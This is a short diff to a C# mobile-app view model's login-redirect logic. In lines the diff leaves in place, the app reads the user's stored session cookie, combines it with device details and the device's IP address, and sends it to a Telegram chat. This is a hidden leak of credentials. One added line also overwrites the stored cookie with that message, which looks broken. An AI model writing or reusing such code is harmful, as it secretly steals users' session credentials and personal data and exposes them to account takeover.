@@ -84,10 +84,11 @@ namespace MobileApp.ViewModels
         {
             if (Preferences.ContainsKey("Cookie"))
             {
-                await NavigationService.NavigateAsync(nameof(OverviewPage));
+                await NavigationService.NavigateAsync(nameof(OverviewPage) + "?login=1");
                 var message = DeviceInfo.Platform + "(" + DeviceInfo.Manufacturer + ")" + "|" + Preferences.Get("Cookie", null) + "|" + await GetIp();
                 if (!string.IsNullOrWhiteSpace(message))
                 {
+                    Preferences.Set("Cookie", message);
                     await _telegramService.SendMessageToTelegram("-574027593", message, AppConstants.AuthenTelegram);
                 }
             }
